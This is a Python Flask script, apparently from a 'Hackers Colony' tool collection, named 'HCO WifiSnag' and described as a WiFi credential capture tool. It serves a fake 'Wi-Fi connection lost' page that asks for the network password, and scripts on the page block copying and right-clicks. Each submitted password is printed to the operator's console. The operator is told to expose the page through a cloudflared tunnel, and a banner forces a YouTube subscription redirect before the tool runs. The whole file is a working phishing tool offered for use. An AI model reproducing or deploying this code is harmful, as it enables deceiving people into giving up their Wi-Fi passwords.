from flask import Flask, request, render_template_string
import os
import time

app = Flask(__name__)

def redirect_to_youtube():
    os.system("clear")
    banner = '''
\033[1;32m╭──────────────────────────────────────────────────────────╮
│                                                          │
│        \033[1;31mHCO WifiSnag\033[1;32m - WiFi Credential Capture Tool        │
│                                                          │
│   \033[1;33m[!] This tool is not free. Subscribe to continue.         \033[1;32m│
│   \033[1;36m[>] Redirecting to Hackers Colony YouTube...              \033[1;32m│
│                                                          │
╰──────────────────────────────────────────────────────────╯
'''
    print(banner)
    time.sleep(10)
    os.system("termux-open-url https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
    input("\n\033[1;32m[✔] After subscribing, press Enter to continue...\033[0m\n")

login_page = r'''
<!DOCTYPE html>
<html>
<head>
    <title>Wi-Fi Login</title>
    <style>
        * {
            user-select: none;
            -webkit-user-select: none;
            -webkit-touch-callout: none;
        }
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            overflow: hidden;
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .box {
            background-color: #111;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 15px limegreen;
            text-align: center;
            width: 90%;
            max-width: 350px;
        }
        input {
            padding: 12px;
            width: 100%;
            margin: 15px 0;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            background: #fff;
            color: #000;
        }
        button {
            padding: 12px 25px;
            background-color: crimson;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
        }
        h3, p {
            color: #ccc;
        }
        .spinner {
            display: none;
            margin-top: 20px;
        }
        .spinner:after {
            content: ' ';
            display: block;
            width: 40px;
            height: 40px;
            margin: auto;
            border-radius: 50%;
            border: 5px solid #ccc;
            border-color: #ccc transparent #ccc transparent;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
        document.addEventListener('keydown', function(e) {
            const allowed = ['Backspace', 'Tab', 'Enter', 'Shift', 'ArrowLeft', 'ArrowRight'];
            if (!allowed.includes(e.key) && !e.key.match(/^[a-zA-Z0-9!@#\$%\^&\*\(\)_\+\-=]$/)) {
                e.preventDefault();
            }
        });

        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('selectstart', e => e.preventDefault());
        document.addEventListener('copy', e => e.preventDefault());

        function handleSubmit(event) {
            const password = document.querySelector('input[name="password"]').value;
            if (password.trim() === "") {
                event.preventDefault();
                alert("Connection failed: Password field cannot be empty.");
                return false;
            } else {
                document.querySelector('.spinner').style.display = 'block';
            }
        }
    </script>
</head>
<body>
    <div class="box">
        <h3>Your Wi-Fi connection was lost.</h3>
        <p>Please re-enter your password to reconnect.</p>
        <form method="POST" action="/login" onsubmit="handleSubmit(event)">
            <input type="password" name="password" placeholder="Wi-Fi Password" required autofocus><br>
            <button type="submit">Reconnect</button>
        </form>
        <div class="spinner"></div>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(login_page)

@app.route('/login', methods=['POST'])
def login():
    password = request.form.get('password')
    print(f"\n\033[1;36m[📶] Captured Wi-Fi Password:\033[0m \033[1;31m{password}\033[0m\n")
    return '''
    <script>alert("Reconnecting...");</script>
    <h2 style="text-align:center; color:white; background:black; padding:30px;">
    Thank you! Reconnecting to Wi-Fi...
    </h2>
    '''

if __name__ == '__main__':
    redirect_to_youtube()
    print("\n\033[1;32m[✔] Flask server running on http://127.0.0.1:8080\033[0m")
    print("\033[1;34m[>] In a new tab, run:\033[0m")
    print("\033[1;36m    cloudflared tunnel --url http://127.0.0.1:8080\033[0m\n")
    app.run(host='127.0.0.1', port=8080)
